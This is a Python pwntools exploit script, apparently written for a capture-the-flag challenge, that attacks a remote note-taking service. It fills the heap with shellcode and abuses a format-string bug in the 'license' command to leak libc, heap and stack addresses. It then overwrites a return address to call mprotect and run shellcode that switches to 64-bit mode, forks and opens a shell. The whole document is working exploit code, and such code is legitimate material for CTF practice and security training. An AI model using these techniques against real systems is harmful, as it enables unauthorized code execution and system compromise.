#!/usr/bin/python

from pwn import *
import subprocess
import sys

sft = shellcraft

host, port = 'pwn02.grandprix.whitehatvn.com', 23502
if len(sys.argv) == 1:
  host = '127.0.0.1'

r = remote(host, port)
r.sendline('NAME')
r.sendline('EMAIL')
r.sendline('PHONE')

def pt():
  r.recvuntil('cmd#:')

def add(name, date, body):
  pt()
  r.sendline('add')
  r.sendline(name)
  r.sendline(date)
  r.send(body)

context.clear(arch='amd64')
sc64 = asm(
  sft.fork() +
  '''
    test eax, eax
    jne exit
    %s
  exit:
  ''' % sft.sh()+
  sft.exit()+
'')
context.clear(arch='i386')

sc = asm(
  '''
    push 0x33
    call change
    jmp s64
  change:
    retf
  s64:
  ''' ) + sc64

# to read more shellcode
sc_read = asm(
  '''
    jmp real_sc
  back:
    pop esi
    %s
  jmp go
  real_sc:
    call back
  go:
  ''' % sft.read(0, 'esi', 0x1000)
)

assert '\n' not in sc_read
assert '\x00' not in sc_read
add('123', '456', sc_read+'\n')
p = log.progress('adding notes')
for _ in xrange(98):
  p.status(str(_))
  add('123', '456', "A\n")

add('123', '456', ("M"*2+'K'+p32(0xdeadbeef)).rjust(299, "A"))
p.success()

r.sendline('cfont')
r.sendline('99')
r.sendline('type 4') # teencode
r.sendline('exit')
def read(idx):
  pt()
  r.sendline('read')
  r.sendline(str(idx))
  r.recvuntil('Body :')
  return r.recvline()
s = read(99)
seed = u32(s[s.index(p32(0xdeadbeef))+4:-1])
log.info('seed = %x' % seed)
pp = process('./get_license')
pp.sendline(str(seed))
license = '-'.join(pp.recvline().strip().split(' '))
pp.close()

def leak(addr):
  pt()
  r.sendline('license')
  r.sendline(license)
  r.sendline('Y')
  cafe = 0x0804C204
  st = 7
  target = p32(0xcafebabe)
  fmt = ''
  now = 0
  for i in xrange(len(target)):
    t = ord(target[i]) - now
    if t <= 0: t += 256
    fmt += "%{}c%{}$hhn".format(t, st+i)
    now = ord(target[i])
  fmt += "@@@@%11$sQQQQ"
  r.sendline(fmt)
  r.sendline('zz')
  r.sendline(p32(cafe)+p32(cafe+1)+p32(cafe+2)+p32(cafe+3)+p32(addr))
  r.recvuntil('@@@@')
  s = r.recvuntil('QQQQ')[:-4]
  s += '\x00'
  return s
  

free_got = 0x0804BFA4
libc_free = u32((leak(free_got))[:4])
#dynelf = DynELF(leak, libc_free-0x60000)
#print dynelf.lookup('system')
libc = ELF('libc.so.6')
libc.address = libc_free - libc.symbols['free']
log.info('libc @ %#x' % (libc.address))
environ = u32(leak((libc.symbols['environ']))[:4])
log.info('environ @ %#x' % (environ))
retaddr = environ - 288 # return address at stack of cmd_license
heap_base = u32(leak(0x0804c060)[:4]) - 0x170
log.info('heap base @ %#x' % heap_base)

def write(addr, data):
  # no need cafebabe any more!
  pt()
  assert len(data) % 4 == 0
  r.sendline('license')
  r.sendline(license)
  r.sendline('Y')
  st = 57
  target = data
  fmt = ''
  now = 0
  address = ''
  for i in xrange(0, len(target), 2):
    cur = ord(target[i]) | (ord(target[i+1]) << 8)
    t = cur - now
    if t <= 0: t += 65536
    fmt += "%{}c%{}$hn".format(t, st+i/2)
    now = cur
    address += p32(addr + i)
  r.sendline(fmt.ljust(200, '\x00') + address)
  r.sendline('zz')
  r.sendline('zz')
  r.recvuntil('Thank')
  r.recvuntil('<3\n')

write(retaddr, flat(libc.symbols['mprotect'], heap_base+0x1b0, heap_base, 0x1000, 7))
r.send(sc)
r.interactive()
